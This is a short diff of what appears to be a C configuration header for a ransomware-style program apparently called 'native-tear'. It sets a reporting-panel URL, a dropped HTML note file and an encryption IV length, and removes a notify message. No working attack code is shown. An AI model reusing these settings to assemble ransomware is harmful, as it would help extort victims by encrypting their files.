@@ -15,11 +15,6 @@
 #define URL_PANEL "http://localhost/add.php"
 
 /*
-* Message to display
-*/
-const char *NOTIFY_MESSAGE = "<p>native-tear</p>";
-
-/*
 * If notification file should be created
 */
 #define OPEN_FILE true
@@ -28,3 +23,5 @@ const char *NOTIFY_MESSAGE = "<p>native-tear</p>";
 * Notification file name
 */
 #define NOTIFY_FILENAME "note.html"
+
+#define IV_LEN (128/8)
